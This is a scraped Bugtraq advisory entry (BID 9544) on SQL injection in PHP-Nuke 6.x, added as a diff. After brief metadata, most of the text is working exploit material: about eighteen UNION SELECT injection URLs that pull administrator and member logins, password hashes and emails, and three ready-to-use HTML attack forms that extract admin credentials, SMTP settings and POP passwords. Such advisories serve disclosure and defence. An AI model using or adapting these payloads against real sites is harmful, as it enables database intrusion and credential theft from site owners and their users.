@@ -1,0 +1,124 @@
+#SpeeDr00t@Black Falcon<br>#bid9544<p><b><span style="font-size: 18pt;">PHP-Nuke Multiple Module SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9544/info">info</a><br><a href="http://www.securityfocus.com/bid/9544/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9544/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9544/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9544/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				9544
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 02 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 02 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to Security Corporation.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Francisco Burzi PHP-Nuke 6.9 <br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.7 <br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.6 <br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.5  RC3<br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.5  RC2<br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.5  RC1<br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.5  FINAL<br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.5  BETA 1<br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.5 <br/>
+					
+				
+					Francisco Burzi PHP-Nuke 6.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Francisco Burzi PHP-Nuke 7.0 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following examples were submitted:<br/><br/>- http://www.example.com/modules.php?name=Web_Links&amp;l_op=viewlink&amp;cid=1%20UNION%20<br/>SELECT%20pwd,0%20FROM%20nuke_authors%20LIMIT%201,2<br/><br/>- http://www.example.com/modules.php?name=Web_Links&amp;l_op=viewlink&amp;cid=0%20UNION%20SEL<br/>ECT%20pwd,0%20FROM%20nuke_authors<br/><br/>- http://www.example.com/modules.php?name=Web_Links&amp;l_op=brokenlink&amp;lid=0%20UNION<br/>%20SELECT%201,aid,name,pwd%20FROM%20nuke_authors<br/>Display the login, the name and the password of an administrator if<br/>the link 0 does not exist.<br/><br/>- http://www.example.com/modules.php?name=Web_Links&amp;l_op=visit&amp;lid=-1%20UNION%20<br/>SELECT%20pwd%20FROM%20nuke_authors<br/>Re-steer towards the encrypted password.<br/><br/>- http://www.example.com/modules.php?name=Web_Links&amp;l_op=viewlinkcomments&amp;lid=-1%20<br/>UNION%20SELECT%20aid,1,pwd,1%20FROM%20nuke_authors/*<br/>Display all the logins administrator as well as their<br/>encrypted passwords.<br/><br/>- http://www.example.com/modules.php?name=Web_Links&amp;l_op=viewlinkeditorial&amp;lid=-1<br/>%20UNION%20SELECT%20name,1,pwd,aid%20FROM%20nuke_authors<br/>Display logins, names and encrypted passwords of all the administrators.<br/><br/>- http://www.example.com/modules.php?name=Downloads&amp;d_op=viewdownload&amp;cid=-1%20<br/>UNION%20SELECT%20user_id,username,user_password%20FROM%20nuke_users/*<br/>Display all the pseudos of the users, followed by their encrypted password.<br/><br/>- http://www.example.com/modules.php?name=Downloads&amp;d_op=modifydownloadrequest&amp;<br/>lid=-1%20UNION%20SELECT%200,username,user_id,user_password,name,<br/>user_email,user_level,0,0%20FROM%20nuke_users<br/>Display logins, ID, encrypted passwords, names, emails and levels of<br/>all the registered members.<br/><br/>- http://www.example.com/modules.php?name=Downloads&amp;d_op=getit&amp;lid=-1%20UNION%20<br/>SELECT%20user_password%20FROM%20nuke_users%20WHERE%20user_id=5<br/><br/>- http://www.example.com/modules.php?name=Downloads&amp;d_op=rateinfo&amp;lid=-1%20UNION%20<br/>SELECT%20user_password%20FROM%20nuke_users%20WHERE%20user_id=5<br/>Re-steer towards the encrypted password of the user id of which is 5.<br/><br/>- http://www.example.com/modules.php?name=Downloads&amp;d_op=viewdownloadcomments&amp;<br/>lid=-1%20UNION%20SELECT%20username,user_id,user_password,1%20<br/>FROM%20nuke_users/*<br/><br/>- http://www.example.com/modules.php?name=Downloads&amp;d_op=viewdownloadeditorial&amp;lid=-1<br/>%20UNION%20SELECT%20username,1,user_password,user_id%20FROM%20nuke_users<br/>Display logins, ID and encrypted password of all the members.<br/><br/>- http://www.example.com/modules.php?name=Sections&amp;op=listarticles&amp;secid=-1%20UNION<br/>%20SELECT%20pwd%20FROM%20nuke_authors<br/><br/>- http://www.example.com/modules.php?name=Sections&amp;op=listarticles&amp;secid=-1%20UNION<br/>%20SELECT%200,0,pwd,0,0%20FROM%20nuke_authors%20WHERE%201/*<br/><br/>- http://www.example.com/modules.php?name=Sections&amp;op=printpage&amp;artid=-1%20UNION%20<br/>SELECT%20aid,pwd%20FROM%20nuke_authors<br/><br/>- http://www.example.com/modules.php?name=Sections&amp;op=viewarticle&amp;artid=-1%20UNION%20<br/>SELECT%200,0,aid,pwd,0%20FROM%20nuke_authors<br/><br/>- http://www.example.com/modules.php?name=Reviews&amp;rop=showcontent&amp;id=-1%20UNION%20<br/>SELECT%200,0,aid,pwd,email,email,100,pwd,url,url,10000,name%20FROM%20nuke_autho<br/>rs/*<br/><br/>--------------------PHPNUKEexploit1.html--------------------<br/>&lt;html&gt;<br/>&lt;head&gt;&lt;title&gt;PHP-Nuke 6.9 SQL Injection Vulnerability Exploit&lt;/title&gt;&lt;/head&gt;<br/>&lt;body&gt;<br/>&lt;form method="POST" action="http://target/modules.php?name=Sections"&gt;<br/>&lt;input type="hidden" name="op" value="printpage"&gt;<br/>&lt;input type="text" name="artid" value="-1 UNION SELECT<br/>CONCAT(name,char(58),aid),pwd FROM nuke_authors"&gt;<br/>&lt;input type="submit"&gt;<br/>&lt;/form&gt;<br/>&lt;p align="right"&gt;A patch can be found on &lt;a<br/>href="http://www.phpsecure.info" target="_blank"&gt;phpSecure.info&lt;/a&gt;&lt;br&gt;<br/>For more informations about this exploit :<br/>&lt;a href="http://www.security-corporation.com/advisories-026.html"<br/>target="_blank"&gt; Security-Corporation.com&lt;/a&gt;&lt;/p&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;<br/>--------------------PHPNUKEexploit1.html--------------------<br/><br/>--------------------PHPNUKEexploit2.html--------------------<br/>&lt;html&gt;<br/>&lt;head&gt;&lt;title&gt;PHP-Nuke 6.9 SQL Injection Vulnerability Exploit&lt;/title&gt;&lt;/head&gt;<br/>&lt;body&gt;<br/>&lt;form method="POST" action="http://target/modules.php?name=Downloads"&gt;<br/>&lt;input type="hidden" name="d_op" value="viewdownloadeditorial"&gt;<br/>&lt;input type="text" name="lid" value="-1 UNION SELECT<br/>config_name,0,config_value,0 FROM nuke_bbconfig where<br/>config_name=char(115,109,116,112,95,104,111,115,116) OR<br/>config_name=char(115,109,116,112,95,117,115,101,114,110,97,109,101) OR<br/>config_name=char(115,109,116,112,95,112,97,115,115,119,111,114,100)"&gt;<br/>&lt;input type="submit"&gt;<br/>&lt;/form&gt;<br/>&lt;p align="right"&gt;A patch can be found on &lt;a<br/>href="http://www.phpsecure.info" target="_blank"&gt;phpSecure.info&lt;/a&gt;&lt;br&gt;<br/>For more informations about this exploit :<br/>&lt;a href="http://www.security-corporation.com/advisories-026.html"<br/>target="_blank"&gt; Security-Corporation.com&lt;/a&gt;&lt;/p&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;<br/>--------------------PHPNUKEexploit2.html--------------------<br/><br/><br/>--------------------PHPNUKEexploit3.html--------------------<br/>&lt;html&gt;<br/>&lt;head&gt;&lt;title&gt;PHP-Nuke 6.9 SQL Injection Vulnerability Exploit&lt;/title&gt;&lt;/head&gt;<br/>&lt;body&gt;<br/>&lt;form method="POST" action="http://target/modules.php?name=Downloads"&gt;<br/>&lt;input type="hidden" name="d_op" value="viewdownloadeditorial"&gt;<br/>&lt;input type="text" name="lid" value="-1 UNION SELECT<br/>char(120),NOW(),char(32),CONCAT(char(60,98,114,62,76,111,103,105,110,32,58,3<br/>2),uname,char(60,98,114,62,60,98,114,62,80,97,115,115,119,111,114,100,32,58,<br/>32),passwd,char(60,98,114,62))<br/>FROM nuke_popsettings"&gt;<br/>&lt;input type="submit"&gt;<br/>&lt;/form&gt;<br/>&lt;p align="right"&gt;A patch can be found on &lt;a<br/>href="http://www.phpsecure.info" target="_blank"&gt;phpSecure.info&lt;/a&gt;&lt;br&gt;<br/>For more informations about this exploit :<br/>&lt;a href="http://www.security-corporation.com/advisories-026.html"<br/>target="_blank"&gt; Security-Corporation.com&lt;/a&gt;&lt;/p&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;<br/>--------------------PHPNUKEexploit3.html--------------------
+	
+		<ul>
+</ul>
+</div>
